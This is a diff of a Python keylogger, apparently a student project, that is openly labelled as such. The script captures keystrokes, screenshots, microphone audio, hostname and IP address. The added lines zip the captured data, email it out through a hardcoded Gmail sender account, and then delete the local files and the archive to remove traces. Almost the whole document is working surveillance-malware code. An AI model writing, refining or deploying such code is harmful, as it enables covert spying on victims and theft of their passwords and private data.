@@ -1,6 +1,7 @@
 # Keylogger
 
 # Libraries
+import shutil
 import smtplib
 import ssl
 from email import encoders
@@ -24,8 +25,7 @@ import zipfile
 
 session_folder = str(datetime.now().strftime("%Y-%m-%d %H.%M.%S"))
 os.mkdir(session_folder)
-log_directory = session_folder + "\\"
-logging.basicConfig(filename=log_directory + "log_results.txt", level=logging.DEBUG, format='%(message)s', filemode='w')
+logging.basicConfig(filename=os.path.join(session_folder, "log_results.txt"), level=logging.DEBUG, format='%(message)s', filemode='w')
 logging.getLogger("urllib3").setLevel(logging.WARNING)
 
 sender_email = "tnm031keylogger@gmail.com"
@@ -48,7 +48,7 @@ keys = []
 
 def screenshot(image_name):
     im = ImageGrab.grab()
-    im.save(session_folder + "\\" + image_name)
+    im.save(os.path.join(session_folder, image_name))
 
 
 # Declare the function to return all file paths of the particular directory
@@ -73,6 +73,7 @@ def send_mail(filename):
         # Email client can usually download this automatically as attachment
         part = MIMEBase("application", "octet-stream")
         part.set_payload(attachment.read())
+        part.add_header('Content-Disposition', "attachment", filename=session_folder + ".zip")
 
     encoders.encode_base64(part)
 
@@ -87,7 +88,7 @@ def send_mail(filename):
 
 # get the computer information
 def computer_information():
-    with open(session_folder + "\\systeminfo.txt", "a") as f:
+    with open(os.path.join(session_folder, "systeminfo.txt"), "a") as f:
         hostname = socket.gethostname()
         ipaddr = socket.gethostbyname(hostname)
         try:
@@ -111,18 +112,16 @@ def microphone():
     fs = 44100
     seconds = 5
 
-    recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+    recording = sd.rec(int(seconds * fs), samplerate=fs, channels=1) # Test if channels=1 works on windows, else 2
     sd.wait()
 
-    write(session_folder + "\\audio.wav", fs, recording)
+    write(os.path.join(session_folder, "audio.wav"), fs, recording)
 
 
 microphone()
 
 
 def on_release(key):
-    print('{0} release'.format(
-        key))
     if key == Key.esc:
         # Stop listener
         return False
@@ -142,7 +141,6 @@ def on_press(key):
     elif key == keyboard.Key.space:
         keys.append(" ")
 
-# Save to file if password is mentioned
     elif key == keyboard.Key.enter:
         s = "".join(keys)
         logging.info(s)
@@ -155,7 +153,7 @@ def main():
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
     # Assign the name of the directory to zip
-    dir_name = os.path.abspath(os.getcwd() + "\\" + session_folder)
+    dir_name = os.path.abspath(os.path.join(os.getcwd(), session_folder))
 
     # Call the function to retrieve all files and folders of the assigned directory
     filePaths = retrieve_file_paths(dir_name)
@@ -175,6 +173,10 @@ def main():
             zip_file.write(file)
 
     print(dir_name + '.zip file is created successfully!')
+    shutil.rmtree(dir_name)
+
+    send_mail(str(dir_name + ".zip"))
+    os.remove(dir_name + ".zip")
 
 
 if __name__ == '__main__':
